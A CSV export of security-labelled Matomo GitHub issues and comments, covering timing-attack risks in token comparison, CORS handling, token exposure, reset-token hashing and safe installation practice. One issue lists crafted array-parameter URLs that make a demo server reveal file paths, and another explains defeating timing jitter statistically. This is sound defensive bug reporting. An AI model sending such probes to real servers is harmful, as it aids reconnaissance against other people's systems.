repository,number,title,description,comments,is_pr,labels
matomo-org/matomo,124434256,"Preventing timing attacks on authentication","### Background

See http://codahale.com/a-lesson-in-timing-attacks/. Also, Github [advises](https://developer.github.com/webhooks/securing/#validating-payloads-from-github) using constant-time string comparison with its authentication token.
### Issue

The `authenticateWithToken()` and `authenticateWithTokenOrHashToken()` functions of the Login plugin (see https://github.com/piwik/piwik/blob/2.16.0-b1/plugins/Login/Auth.php#L72-L96) currently don't use a constant-time string comparison when checking validity of `token_auth`.

Specifically:
1. `authenticateWithTokenOrHashToken()`: Following comparisons are not constant-time:
   - `SessionInitializer::getHashTokenAuth($login, $user['token_auth']) === $token`
   - `$user['token_auth'] === $token`
2. `authenticateWithToken()`: I'm not familiar with DB access, but it seems possible that `$user = $this->userModel->getUserByTokenAuth($token)` is not constant-time, referring to the comparison by MySQL of `$token` to table entries on value search (requested in https://github.com/piwik/piwik/blob/2.16.0-b1/plugins/UsersManager/Model.php#L175).

~~Note: `authenticateWithPassword()` does not seem to be affected, because it compares hashes of the password. Which should make such character-by-character recovery impossible, given that a hash changes entirely with a slightest change of the password.~~_(See next comment.)_
### Possible Solutions:
1. `authenticateWithTokenOrHashToken()`: See, e.g., https://github.com/phpseclib/phpseclib/blob/2.0.0/phpseclib/Crypt/RSA.php#L2201-L2213 for an example on constant-time string comparison. (Its length check should not be an issue with `token_auth` in Piwik, since it's a (MD5) hash, whose length is constant and thus does not contain any information useful to an attacker.) ~~Alternatively, see next point.~~
   
   Another secure string comparison example can be found here: https://github.com/defuse/php-encryption/blob/399fc4c4798b301681888c2608b0ddd060d477da/src/Crypto.php#L409.

~~2. `authenticateWithToken()`: A solution could be storing the `token_auth` in hashed form, similarly to the password. And similarly, hashing the received value before searching for it in the DB.~~_(See next comment.)_
### Additional Notes

It seems to be very hard to exploit this with a web application (especially over the internet). So that this is rather an ""enhancement"". E.g., following test:

```
$time_start = microtime(true);

for ( $i = 0; $i < 1000000; ++$i )
{
   $results = strcmp('stringstring', 'stringstring');
}

$time_end = microtime(true);
printf(""strcmp with matching strings took %f seconds\n"", $time_end - $time_start);

$time_start = microtime(true);

for ( $i = 0; $i < 1000000; ++$i )
{
   $results = strcmp('stringstring', 'weoisdfd');
}

$time_end = microtime(true);
printf(""strcmp with non-matching strings took %f seconds\n"", $time_end - $time_start);

$time_start = microtime(true);

for ( $i = 0; $i < 1000000; ++$i )
{
   $results = 'stringstring' === 'stringstring';
}

$time_end = microtime(true);
printf(""=== with matching strings took %f seconds\n"", $time_end - $time_start);

$time_start = microtime(true);

for ( $i = 0; $i < 1000000; ++$i )
{
   $results = 'stringstring' === 'weoisdfd';
}

$time_end = microtime(true);
printf(""=== with non-matching strings took %f seconds\n"", $time_end - $time_start);
```

on http://sandbox.onlinephpfunctions.com/ outputs, e.g., following with PHP 5.0.5:

```
strcmp with matching strings took 0.411142 seconds
strcmp with non-matching strings took 0.393982 seconds
=== with matching strings took 0.192044 seconds
=== with non-matching strings took 0.172884 seconds
```

~~I.e., a difference of ca. 20ms per 1000000 comparisons, or ca. 20ns per comparison with `===`.~~_(See next comment.)_

With PHP 5.6.2 it's faster, but the difference is similar, e.g.:

```
strcmp with matching strings took 0.246002 seconds
strcmp with non-matching strings took 0.236303 seconds
=== with matching strings took 0.047865 seconds
=== with non-matching strings took 0.023867 seconds
```

P.S.: I'm not an expert with any of the above, in any way shape or form :)
","Having thought about this issue a bit more, **here is an extension/update to the original post:**

### Issue

Here are additional points. (Points 1 and 2 of the original post are still valid.)

  `3.` Unlike stated above, the `authenticateWithPassword()` function (see https://github.com/piwik/piwik/blob/2.16.0-b1/plugins/Login/Auth.php#L61-L70) is also affected on its check of `$user['password'] === $passwordHash`.
  The reason is that the currently used MD5 hash function is [very broken](https://en.wikipedia.org/wiki/MD5#Security), as can be any hash function in future. To ""break in"", an attacker would need:
- Try any string as password, making sure that the string's hash value does not change in the already recovered characters.
- Make sure that the tried string's length stays the same between the tries, so that its hash calculation time stays constant.
  
  Now, that last point makes the attack much more difficult (if not almost impossible), because it's one thing to find a collision with strings of any length, and a completely different one to do so with strings of equal length. Still, there is a theoretical possibility (the longer the strings, the easier), and hash functions only get more broken over time.
  
  Please note that:
- The attacker would not need to recover the actual password, but just a string whose hash value equals (i.e. collides with) the hash value of the password.
- Addition of a salt to the password would make no difference for a timing attack. Because a salt just changes the hash value compared against.

`4.` `isTokenValid()` on **password reset token** (https://github.com/piwik/piwik/blob/2.16.0-b1/plugins/Login/PasswordResetter.php#L234) is not constant-time on its check of `$generatedToken === $token`.

`5.` `verifyNonce()` on **nonce** (https://github.com/piwik/piwik/blob/2.16.0-b1/core/Nonce.php#L76) is not constant-time on its check of `$cnonce !== $nonce`.

`6.` `validatePhoneNumber()` on **phone number verification** (https://github.com/piwik/piwik/blob/2.16.0-b1/plugins/MobileMessaging/API.php#L273) is not constant-time on its check of `$verificationCode == $phoneNumbers[$phoneNumber]`.

`7.` `setIgnoreCookie()` on **ignore cookie setting** (https://github.com/piwik/piwik/blob/2.16.0-b1/plugins/UsersManager/Controller.php#L302) is not constant-time on its check of `$salt !== $this->getIgnoreCookieSalt()`.

### Possible Solutions
1. `authenticateWithTokenOrHashToken()`:
   1. Either: Same as in the original post.
   2. Or: https://github.com/piwik/piwik/issues/9457 (which is similar to point 3.ii. below).
2. `authenticateWithToken()`: This point in the original post is wrong. An additional hash round would not make a difference (assuming that hashing is a constant-time operation) - it would just change the hash value compared against. Instead, a solution could be:
   1. ~~Either: An addition of an artificial random time jitter, to overlay the DB search time. One with a resolution in the area of the DB search time difference due to the non-constant comparison.~~ _(See next comment.)_
   2. Or: Same as 1.ii. above.
3. `authenticateWithPassword()`:
   1. Either: Same as in point 1.i. above.
   2. Or: https://github.com/piwik/piwik/issues/5728#issuecomment-162944909.
      It uses `password_verify()` which is [safe against timing attacks](https://secure.php.net/manual/en/function.password-verify.php). It requires PHP 5 >= 5.5.0, which should be fine for Piwik 3.0 (https://github.com/piwik/piwik/issues/8156).
4. `isTokenValid()`: Same as in point 1.i. above.
5. `verifyNonce()`: Same as in point 1.i. above.
6. `validatePhoneNumber()`: Same as in point 1.i. above.
7. `setIgnoreCookie()`: Same as in point 1.i. above.

### Additional Notes

The test in the original post was not correct, in that the comparison time difference of only one character should be tested:

```
$time_start = microtime(true);

for ( $i = 0; $i < 1000000; ++$i )
{
   $results = 'aa' === 'ab';
}

$time_end = microtime(true);
printf(""=== with matching strings took %f seconds\n"", $time_end - $time_start);

$time_start = microtime(true);

for ( $i = 0; $i < 1000000; ++$i )
{
   $results = 'aa' === 'bb';
}

$time_end = microtime(true);
printf(""=== with non-matching strings took %f seconds\n"", $time_end - $time_start);
```

Which outputs following with PHP 5.0.5:

```
=== with matching strings took 0.188403 seconds
=== with non-matching strings took 0.183385 seconds
```

I.e., a difference of ca. 5ms per 1000000 comparisons, or ca. 5ns per comparison. And about half of that with PHP 5.6.2.

Which makes this even more theoretical in the realm of web applications (especially over the Internet).
The above solution 2.i. (time jitter ""padding"" of the comparison time) would not work. It would make an attack slower, but not prevent it. Because of a possibility of a statistical analysis attack. Paraphrasing https://www.reddit.com/r/netsec/comments/3zc5qu/https_bicycle_attack/cylek82:

If you were to observe enough samples, you'd eventually identify a case where the random time padding length reached its minimum, which would give you a close estimate of the actual comparison time.

For example, if you say ""padding time is randomly selected between 5 and 50 ns, with a resolution of 5ns"", after 10 observations you can assume that the actual comparison time is probably 5ns shorter than the smallest comparison time you observed. Your confidence factor only goes up with the number of observations.
From another discussion, from 2010, [Nanosecond Scale Remote Timing Attacks On PHP Applications: Time To Take Them Seriously?](https://web.archive.org/web/20150906004145/http://blog.astrumfutura.com/2010/10/nanosecond-scale-remote-timing-attacks-on-php-applications-time-to-take-them-seriously/):

> Throw in possible situation improvements (for an attacker) due to CPU/RAM constraints, increased sampling and analysis, and we now have something a heck of a lot more worrying. The real possibility [is] that our network jitter defence is dead in the water – the gulf between a 1ns memcmp() comparison and a 15ns detection resolution no longer looks insurmountable.

It even advocates for timing attack prevention on **user name (""login"")** (which is, similarly to the issue point 2 above, also vulnerable on its DB look-up in https://github.com/piwik/piwik/blob/2.16.0-b1/plugins/Login/Auth.php#L63):

> It has long been noted by programmers that, where usernames are not explicitly public by design, disclosing usernames indirectly is a problem. If nothing else it increases the risk of cross referencing username/password combinations from other more seriously compromised websites. We all use a different password for every single site, don’t we?

But, in my opinion (given its implementation complexity), that would not be needed with a timing attack-secure password handling.
A method was added in https://github.com/matomo-org/matomo/pull/16696 and documented it in the checklist and security guide plus it's a public API. we'll only need to use it in the codebase eventually",no,"c: Security,"
matomo-org/matomo,104426717,"do not allow to set access to non existing websites","As a Super User, currently I can set user access to websites that don't exist yet.

Reproduce:
- go to: http://localhost.com/piwik-master/index.php?date=yesterday&module=API&format=json&method=UsersManager.setUserAccess&period=day&userLogin=user1&access=view&idSites=1,4,2,5&token_auth=xyz
- when setting permission by setting idSites = non existent values (eg. `4,5`)  the user will get access to non existing sites. When these new sites will be added t,he user will have access already on these new websites.
- Expected: it should not be possible to assign access to a website that does not yet exist.

reported by Haseeb 
",,no,"c: Security,"
matomo-org/matomo,452436369,"rate limit scheduled email reports","Email reports in Matomo can be abused to send many emails. For example by creating a scheduled email report, then adding a few dozens (or more) email addresses (for example fake, or real), and then clicking ""Send Report Now"". The email report will be sent to all email addresses. The button can be clicked again and again. This fake email can be triggered every day as well. 

Somehow it would be good to implement rate limiting. But not sure how the rate limiting should work... 

See also https://github.com/matomo-org/matomo/issues/13813","Maybe an even better (even though complexer to implement) solution would be to require an opt-in for all emails (similar to https://github.com/matomo-org/matomo/issues/13533)

So if you add an email to a report, it only gets added after the user clicked on a confirmation link.",no,"Major,c: Security,"
matomo-org/matomo,1207536963,"`POST` to `matomo.php` Endpoint Returns 204 When Setting An `Origin` Header Not On The `cors_domains`","According to the documentation [in the Matomo FAQ](https://matomo.org/faq/how-to/faq_18694/), CORS settings can be set by setting the `cors_domains` array in the `config.ini.php` to only allow certain domains to interact.  However even if this is set, when sending a `POST` request to the `matomo.php` endpoint with a domain in the `Origin` request header that is not on the list still returns a `204` instead of an error.

## Expected Behavior
When the `Origin` request header is set to a URL not on the list, the response should be some sort of `4xx` response.

## Current Behavior
Response is a `204`

## Possible Solution
Set behavior to return a `401` in this instance

## Steps to Reproduce (for Bugs)
1. Set a value in `cors_domains` in the `config.ini.php` to your domain.
2. Verify these values on the `System` -> `General Settings` page under the `Cross-Origin Resource Sharing (CORS) domains` section.
3. Send a `POST` request to the `/matomo.php` endpoint with the `Origin` header set to a value not in the `cors_domains` array (for example, `https://evil.site`
4. Observe response is `204`.

## Context
This bug could allow malicious actors to hit endpoints from environments outside the allowed websites.


## Your Environment

<!-- Include as many relevant details about the environment you experienced the bug in -->
<!-- You can find some of that information in the system check -->
* Matomo Version: `4.9.0`
* PHP Version: `8.0.17`
* Server Operating System: Linux (using Matomo docker container `4.0.9-apache`)
* Additionally installed plugins: None
* Browser: Observed in Chrome `100.0.4896.127` and using Postman
* Operating System: Mac OS X
","@Zozman thanks for the bug report, I think that's a bug I made in this PR, https://github.com/matomo-org/matomo/pull/19030.  

Here should be instead of `*`, I believe should be a combination of `cors_domains` and sites domains in the database. ping @sgiehl 

https://github.com/matomo-org/matomo/blob/dc753b2fc6e691d0830ec03143ae06c091474296/core/Tracker.php#L119
should we assign this issue to the 5.0 milestone, since it's breaking changes?I'm not sure. Thinking of tracking I'm wondering if 204 is maybe actually the correct response since the tracking request was processed and we would want to avoid that because of https://github.com/matomo-org/matomo/blob/4.10.1/js/piwik.js#L2843-L2850 we would retry that tracking request.

A 204 would describe exactly above. Request was executed but no response/content.

AFAIK when sending a tracking request and there is a CORS error then the request itself was still executed. It's only that the response wasn't readable for the client. So we'd want to make sure to not send every tracking request twice.
I guess that depends on the expectation. I would actually also assume that a configured cors domain would also disallow requests coming from other origins. In that case it would be correct to send a `403 Forbidden`. We then would need to handle the 403 in another way in tracking js for sure.You can see this in the examples on https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS as well that these send HTTP 2XX (200 and 204) headers. And the browsers decided if the client can read the response.

Also

> CORS failures result in errors but for security reasons, specifics about the error are not available to JavaScript. All the code knows is that an error occurred. The only way to determine what specifically went wrong is to look at the browser's console for details.

<img width=""813"" alt=""image"" src=""https://user-images.githubusercontent.com/273120/172851607-8eae8eb5-5885-477f-a3df-64dad4b53991.png"">

The browser console already shows correctly when a CORS error happens 
<img width=""1466"" alt=""image"" src=""https://user-images.githubusercontent.com/273120/172851903-2fca8d7f-66f0-4d81-895d-4ea84dbf0d0b.png"">



",no,"c: Security,Regression,"
matomo-org/matomo,333223420,"Encourage strong passwords by indicating when passwords are weak (and when password don't match)","I think it'd be helpful for the admin to have the following dynamic (JS-driven) indicators, just like WordPress:

- Indicator for weak passwords
- Indicator for when passwords don't match","That could also be added in admin when changing the own password or creating new usersThanks for the suggestion, it would be great & valuable to encourage users to create strong passwords. 

Maybe we could create+link to a FAQ on Matomo.org explaining that it's important to use password managers, and store the encrypted database on a backed up drive.

Regarding the indicator when password don't match... maybe we could even remove the need to type the password twice, and only have the password field once? As long as people have a valid email address in their profile they can easily reset the password if there was a typo.You could also include a most popular password list and throw an error if the entered password appears in thereI'm moving this to 3.7 as it has a huge security benefit. (move it back, if you have planned it for a later release)
I also like @tsteur's idea of rejecting (or at least warning about) common password.
Maybe this could even be combined with the new have-i-been-pawned api:
https://haveibeenpwned.com/API/v2#PwnedPasswordsMoving it back to the backlog as it currently doesn't have a priority.I disagree with my old post above. I don't think (anymore) that a password strength indicator has a huge security benefit. 
For stopping terrible passwords the plugins in https://github.com/matomo-org/matomo/issues/13666 are enough. 

And any indicator is either incorrect or too simplified or ends up replicating Dropbox's zxcvbn which is too huge for frontend. And one can already easily write a plugin that validates submitted plugins with it. ",no,"Enhancement,c: Security,c: Usability,"
matomo-org/matomo,359244903,"When exporting data and ""Show export URL"" is clicked, don't reveal the full token_auth ","The new feature ""Show export URL"" is very valuable in giving everyone quick access to the API and seeing how the URL is constructed, making it easy to share, etc.

However for security reasons we would not want to reveal the full token_auth on screen. 
Similarly in the Personal settings page where the `token_auth` is displayed to the user, it requires an extra click to reveal the full token. 

So the goal if this issue is to slightly change the behavior, proposal:
* When ""Show export URL"" is clicked, show the textarea but in the string, only show the first few characters and write `...`.
* When user clicks the field to copy/paste it, then reveal the full token_auth and full URL

follows up #11958 #12987","Is this really needed considering you already have to click to see it? Just tested and noticed that currently you need to click, and then double click to select the string. Ideally on the first click to reveal the full URL then the full URL would be selected and then user can copy. it would be more usable.

But an even more secure / usable solution could be maybe:

* The full token_auth is never displayed on screen, and instead it shows the full URL and replaces `token_auth=full_token_here` by `token_auth=start_tok***********`
* on click on the textarea, the value is copied into the clipboard
* and a feedback ""Copied to your clipboard!"" is displayed

Not showing the token_auth on screen would be a security improvement as the token can be easily seen/recorded by someone viewing the screen.I won't be working on this, so unassigning myself. I don't agree with any of the flows. Even the original in the issue.is there maybe a better way not to show the token_auth on screen? anyway it's not urgent for now so removing from milestoneEither you have only a ""copy url"" link, or you simply show it directly on ""show export url"" and accept the fact how Matomo works currently and eventually it'll be refactored to have proper authentication in place. Also when you paste a URL in the address bar, it will show the end of the URL which is usally the token. Next, a more likely risk than screen recording is that users send the exported URL to other people. Ideally you neither show them the URL nor let them copy the URL. Then when we POST to export the URL, the token won't be in the URL at all and will neither appear in access logs.",no,"c: Security,"
matomo-org/matomo,91337459,"security guideline for documentation","I read more and more insecure recommendations in documentation.

I guess the whole documentation needs to be assessed in terms of security.

In respect to software deployment, there's few basic rules that seem important to me:
- Any Software Downloads need to be integrity and origin checked
- Any web server uploads need to be integrity and target checked
- As many files as possible need to be read-only to webserver user (e. g. www-data)
- Any vHost needs to be seperated (one vHost script may not read Files of another vHost).
- Any database needs to be password secured (with no insecure ports open)
- [...]

On Piwik documentation, it already starts insecure: http://piwik.org/docs/installation/#getting-started

```
Before you get started, ensure that you have the following: [...]
    - Access to your web server (via shell or FTP)
    - A FTP Client (if you are installing Piwik on a remote server)
```

I would like to read something about SSH here. Even FTPS has limitations (potentially just encrypting credentials). And there's a difference to SFTP/SCP.

```
Download the latest release Piwik from http://builds.piwik.org/piwik.zip
```

Yes, MITM brings his virus in and we install it on our webservers. With https, this would be _ways_ more secure. Users would not even notice it. HTTPS-Version https://builds.piwik.org/piwik.zip is already available, so why not use it? Just add an ""s""...

```
Open your FTP client [...]
If you have SSH access to your server, you can use it instead of FTP as it is much faster
```

Not just faster, also _ways_ more secure! But wait, why not download piwik directly from the webserver via shell using a secured https connection? This could also be worked around with a tiny PHP script downloading and extracting the installation files if users don't have shell access (still not the best option as it has similar limitations as before).

```
When Piwik is uploaded you can move on to the next step!
```

Did we miss the integrity check? Where's the SHA-x/MD5-Hashsum I should check? Where can I get hashsums _safely_? Keep in mind MITM can also compromise MD5-hashsums when he can compromise a download. If the download link is http, then at least the hashsum should be https.

How is made sure, that most of the files are read-only in the context of the web server (www-data), if users want to update without the web frontend's automatic update. This looks ways too dangerous to me, anyways. Sure, people love it...

```
If you do not have the database information, you may need to ask your web host or technical staff.
```

In many cases this is right. I'm just missing the information that empty passwords can be painful here.

Also consider #7519. You need a security guideline for documentation!

I'm sure we'd see great improvements in the code after that is done! (e.g. https-piwik-api instead of http-piwik-api in default config).

Don't get me wrong. The current documentation is always the easiest way for users, which is good in some way. But I guess most of them don't know what they do when following these recommendations. They should be warned at least if they do insecure stuff.

Now I'm also wondering how you work internally. Do you upload builds via FTP to the piwik web space?

Plus, security related documentation should be https-only. MITM could easily downgrade security level of documentation otherwise (at least if users expect valid https).

Always keep in mind that attackers _will_ use every possibility as soon as they figure out how. E.g. attacks like https://blog.sucuri.net/2015/06/magento-platform-targeted-by-credit-card-scrapers.html

Related: #1867 dating back to 2010...
",":+1: 
I'm also missing the integrity check (SHA-x/MD5-Hashsum), so 👍 for this issue.",no,"c: Website matomo.org,c: Security,"
matomo-org/matomo,1125047930,"Don't suggest a chown root:root","Did an update via console core:update. Was doing it as root, as ... yeah, bash of www-data isn't that functional :) Anyway, got that message at the end:

```
It appears you have executed this update with user root:root, while your Matomo files are owned by www-data:www-data. 

To ensure that the Matomo files are readable by the correct user, you may need to run the following command (or a similar command depending on your server configuration):

$ chown -R root:root /var/www/piwik/piwik
```

Of course, I just copied and executed that command, as it looked ok. Then I figured out, that Matomo doesn't want to run anymore, so I did a chown with www-data:www-data.

I suggest to think about that hint. Not entirely sure wether it's more likely that the files are usually owned by the correct user and it should be assumed that this is correct or there should be a simple check like ""something will break with root ownership for sure"".","Thanks for mentioning this @e7o-de 

It will also fix https://github.com/matomo-org/matomo/issues/17862 and will close that issue as a duplicate.

I think in this example we could adjust the wording and mention that the command may be executed using the wrong user and not only suggest the chown command to prevent such cases. If the user is `root` we could also mention specifically that this is likely executed with wrong user.Possibly we could also prompt user at the start if they aren't using the same user as the files are owned with to make sure they want to continue.",no,"Bug,c: Security,Better processes,"
matomo-org/matomo,1109902266,"When setting up two factor authentication (2FA), don't show the QR code right away","Ideally we would hide it at first, and have a link to make it visible. This way in case you have people around you, you can send them away first.

The link to click to make it visible would need to very obvious, otherwise it's easy to get lost.",,no,"c: Security,"
matomo-org/matomo,538797554," SecureHash is not secure ","As reported by @Findus23 

Not really a vulnerability in itself, but also not secure and might cause issues if someone uses the function without checking in the future. Therefore, I want to document it here.

The function generateSecureHash here is really not secure:

https://github.com/matomo-org/matomo/blob/e92247972a99092eb300bcbc163492542017d1b5/plugins/Login/PasswordResetter.php#L305

It hashes the string with $this->hashData which again calls Common::hash which uses the whirlpool hash which is fast and not intended for cryptographic use cases.

The splitting of data is just distraction as with 50000000 Hashes per second on a simple GTX 1060 Ti there is no need to store rainbowtables.

I guess there is no reason to not use the secure slow hashes used for passwords also for password reset tokens.","Seems to me we could just update the hashData function as follows and it will then use the Password::preferredAlgorithm() hash.

```
    protected function hashData($data)
    {
        return $this->passwordHelper->hash($data);
    }
```

If that makes sense I can toss in a PR pretty quick.Thanks @mwithheld that'd be great if you fired up a PR for this.Assuming the password reset hash should be secure and reproducible, how about using something like is used here:

```
namespace Piwik\Session\SaveHandler;
...
class DbTable
{
...
    const TOKEN_HASH_ALGO = 'sha512';
    ...
    private function hashSessionId($id)
    {
        $salt = SettingsPiwik::getSalt();
        return hash(self::TOKEN_HASH_ALGO, $id . $salt);
    }
```
For better security than sha512, we could choose another algorithm from the [hash_algos()](https://www.php.net/manual/en/function.hash.php) list, e.g. sha3-512.  A [speed comparison is here](https://www.php.net/manual/en/function.hash.php#124509), and an [output length comparison is here](https://www.php.net/manual/en/function.hash.php#124917).

Proof of concept at [https://onecompiler.com/php/3xbpcw5xn](https://onecompiler.com/php/3xbpcw5xn)Guess adding a more secure hashing for the reset token would be fine that way",no,"Help wanted,c: Security,"
matomo-org/matomo,366818301,"Require email verification when changing email address.","Related to https://github.com/matomo-org/matomo/issues/2932 and https://github.com/matomo-org/matomo/issues/6125 (the latter could maybe also be added in the same change)

At the moment every Matomo user could change their E-Mail address to everything they want without any verification (apart from syntax, see https://github.com/matomo-org/matomo/issues/11796). This allows every Matomo user to send an unlimited amount of (for them) SPAM E-Mails to anyone without them ever opting in to receiving them.

When someone tries to change their email address (after confirming their password; https://github.com/matomo-org/matomo/issues/2932) the change should only be saved if the user was able to confirm an link in a sent mail. 
In addition an email should be sent to the old email address informing them that they are loosing access to the account (and to inform an admin if they don't know about the change)
https://github.com/matomo-org/matomo/issues/6125","Slightly refs https://github.com/matomo-org/matomo/issues/13321 :) @tsteur  The only issue I forgot to cross-link :slightly_smiling_face: ",no,"c: Security,c: Usability,"
matomo-org/matomo,37354295,"Prevent path disclosure, automatically hide path from warning messages and backtraces","Path disclosure results to a little piece of information disclosure, the path at which piwik is setup. We better not give out the information even though it is not a problem in itself, it can be used when other attack vectors would be available. Also many users report the bug and it would reduce email traffic and overhead.

The idea would be to automatically remove the path from the error messages, backtraces, in the custom error /exception handler. We could still display the path when the Super User is logged in, just because it would help making things clear.

But for anonymous or view/admin, we should replace the path with empty string.
","from email

```
a[]=
/index.php?a[]=0&b=0&format=xml&method=ExampleAPI.getSum&module=API&token_auth=anonymous
Fatal error: Unsupported operand types in
/home/piwik-demo/www/demo.piwik.org/plugins/ExampleAPI/API.php on line
100
---------------------
b[]=
/index.php/index.php?a=0&b[]=0&format=xml&method=ExampleAPI.getSum&module=API&token_auth=anonymous
Fatal error: Unsupported operand types in
/home/piwik-demo/www/demo.piwik.org/plugins/ExampleAPI/API.php on line
100
----------------------
date[]=
/index.php?action=getEvolutionGraph&columns=revenue&date[]=1&evolutionBy=revenue&idSite=2&idsite=2&module=MultiSites&period=day&viewDataTable=sparkline
Fatal error: Call to a member function toString() on a non-object in
/www2/htdocs/piguik/core/Archive.php on
line 262
----------------------
fontSize[]=
/index.php?aliasedGraph=1&apiAction=getCountry&apiModule=UserCountry&date=last10&fontSize[]=9&format=rss&idSite=2&legendAppendMetric=1&method=ImageGraph.get&module=API&outputType=0&period=day&showLegend=1&token_auth=anonymous&translateColumnNames=
Fatal error: Unsupported operand types in
/www2/htdocs/piguik/plugins/ImageGraph/API.php
on line 163

```
",no,"Task,c: Security,"
matomo-org/matomo,773694921,"Stop tracking Matomo installation IP/URL/Details","I love Matomo and how it complies to GDPR for my visitors....

BUT:  why would you track my server ip, url and installation details during your Version checking?

in /plugins/CoreUpdater/ReleaseChannel.php you add these params:
```
'piwik_version'   => Version::VERSION,
'php_version'     => PHP_VERSION,
'mysql_version'   => Db::get()->getServerVersion(),
'release_channel' => $this->getId(),
'url'             => Url::getCurrentUrlWithoutQueryString(),
'trigger'         => Common::getRequestVar('module', '', 'string'),
'timezone'        => API::getInstance()->getDefaultTimezone()
```

Now I get why you would like to track that info to get to know your user-base... I would like to know more about my visitors too, but I just cannot do that without their consent.

In my humble opinion, it would be better to have the options (apart from maybe piwik_version) optional and only added when the installer asks for consent and the admin/installer/maintainer agrees.
","Thanks for creating the issue. So far you can disable this tracking by disabling automatic update checks: configure the setting `enable_auto_update = 0` within the `[General]` section of your `config/config.ini.php file`.",no,"c: Security,c: Privacy,"
matomo-org/matomo,114489389,"Send an email / text when there is a fail login attempt","We should at least optionally notify a user when there is a failed login attempt. I'd have it enabled by default in core but we could also have it as a plugin on the marketplace or by default disabled.

We'd send an email to the owner of the account letting the user know someone tried to log in using his login name. Maybe we'd also add IP address etc? I'm sure there are many examples for this on the internet. 

We could also only send it after the second or third failed attempt. 

It is a bit related to brute force attack but not really: https://github.com/piwik/piwik/issues/2888
","Nice idea! Maybe a good idea as a first step before #2888 
sound's great!
maybe one should think of sending this mail not always but only after e.g. 3rd failed login attempted?
on the other hand one could extend this to send a mail when some logs in from an other country than the last time (or similar)?
putting the IP in the email would be great - maybe one could reuse geoIP feature
> We'd send an email to the owner of the account letting the user know someone tried to log in using his login name. 

I think superadmin/admin should be made aware too... There's something ""fishy"" after more than 5 attempts...
Good point re other country. I'll create a separate issue for this. They might be developed both in one step at some point but better to have them separated. 
If text messages are configured in a Piwik (eg for scheduled reports) one should ideally also be able to receive it as a text message on your phone to be able to react quickly in case it wasn't you who tried to log in...
I think https://github.com/piwik/piwik/issues/2888 is more valuable first (althrough of course also more complicated to implement)
Just FYI: When an attacker brute forces tokens, no user can be notified as there is only the token and no username. As an attacker, I would not bother about trying to log in through username/password but instead through the API which also avoids needing the nonce etc.

Maybe a simple solution for https://github.com/matomo-org/matomo/issues/2888 is more useful for now?Just seeing #2888 is scheduled for 3.7.0 as well :) FYI: Now that we will have #2888 I will move it out of this milestone. It wouldn't be that valuable when a user can still try to log in through token_auth and basically nobody would get notified. Also it could result in heaps of mails.### hey guys , is there a way to report an ip address that tried to access , my account ? 

the login attempt happened , just after my : 

> user.device_verification_requested | user.login | user.device_verification_success!   

Is there a way that the attacker , tracked my `""user.device_verification_success""` 

cause the attack happened at the same day , just after I did , the `""user.device_verification_success"" `

### Is there a Way to Resolve this ? .... & thanks  

",no,"c: Security,c: New plugin,"
matomo-org/matomo,63101706,"Check for updates over HTTPS","At @mattab's suggestion:

> The check for new version is done over HTTP so far. that's maybe an issue, so feel free to create a new issue for that

See concern here: https://github.com/piwik/piwik/issues/6441#issuecomment-82743149
","I think this can be closed because Matomo already does try to use HTTPS when supported on the server-side. See https://github.com/matomo-org/matomo/blob/2ac2bc1aeaf8efce6bb9af92506311da99e1757f/plugins/Marketplace/config/config.php#L8-L16",no,"Task,c: Security,"
matomo-org/matomo,44435643,"Create a Secure Mode that removes some features from Piwik to increase security ","A Super User has a lot of power and with it comes a lot of responsibility. The goal of this issue is to create a new config setting eg. `secure_mode` that is disabled by default. When enabled it will limit some of the powers of Super Users.

In particular it will prevent:
- uploading custom plugin via .zip upload 
  - create a new config setting for this
- installing plugin from the marketplace
  - set config setting: `enable_marketplace=0`
- Super User seeing other users `token_auth`
  -  set config setting in #6346 

Possibly there are other insecure items that a Super User could do that we want to limit in the secure mode?
",,no,"Enhancement,c: Security,c: Platform,"
matomo-org/matomo,59442979,"When downloading latest Piwik core release, check the PGP signature","Follows up #6441

When we download the latest piwik release over HTTPS, we could also check that the PGP signature is valid. 

Note: not sure how it would work or if it's even possible, but there you go
","(Deleted my previous message, there's a better way.)

You can do verification with the `openssl` command. For example, here's how I manually verify Sparkle updates:

```
sparkleVerify() {
    ARCHIVE=""$1""
    DSAPEM=""$2""
    SIGB64=""$3""
    # echo ""Verifying $ARCHIVE signature $SIGB64 with key: $DSAPEM""
    SIGFILE=$(mktemp -t sig)
    echo -n ""$SIGB64"" | base64 -D > ""$SIGFILE""
    openssl dgst -sha1 -binary ""$ARCHIVE"" | openssl dgst -dss1 -verify ""$DSAPEM"" -signature ""$SIGFILE""
}
```
If you're curious as to how to actually create the keys and the signatures, [look at how Sparkle does it](https://github.com/sparkle-project/Sparkle/tree/master/bin). If you use this method then verification will work with the example I gave above.
Checking PGP signatures in plugins downloaded from Marketplace is covered in https://github.com/piwik/piwik/issues/11909 See also details on how WP does it: https://paragonie.com/blog/2019/05/wordpress-5-2-mitigating-supply-chain-attacks-against-33-internet",no,"Task,c: Security,"
matomo-org/matomo,1207699609,"Once the cors_domains is set apply cors_domains list to the prefight cors","### Description:

Fixes: #19116
Once the cors_domains are set apply the cors_domains list to the prefight cors. By default, it allows all. Maybe we should use the `getAllKnownUrlsForAllSites()` array + cors_domains as the whitelist array. 

### Review

* [ ] [Functional review done](https://developer.matomo.org/guides/pull-request-reviews#functional-review-done)
* [ ] [Potential edge cases thought about](https://developer.matomo.org/guides/pull-request-reviews#potential-edge-cases-thought-about) (behavior of the code with strange input, with strange internal state or possible interactions with other Matomo subsystems)
* [ ] [Usability review done](https://developer.matomo.org/guides/pull-request-reviews#usability-review-done) (is anything maybe unclear or think about anything that would cause people to reach out to support)
* [ ] [Security review done](https://developer.matomo.org/guides/security-in-piwik#checklist)
* [ ] [Wording review done](https://developer.matomo.org/guides/pull-request-reviews#translations-wording-review-done)
* [ ] [Code review done](https://developer.matomo.org/guides/pull-request-reviews#code-review-done)
* [ ] [Tests were added if useful/possible](https://developer.matomo.org/guides/pull-request-reviews#tests-were-added-if-usefulpossible)
* [ ] [Reviewed for breaking changes](https://developer.matomo.org/guides/pull-request-reviews#reviewed-for-breaking-changes)
* [ ] [Developer changelog updated if needed](https://developer.matomo.org/guides/pull-request-reviews#developer-changelog-updated-if-needed)
* [ ] [Documentation added if needed](https://developer.matomo.org/guides/pull-request-reviews#documentation-added-if-needed)
* [ ] Existing documentation updated if needed
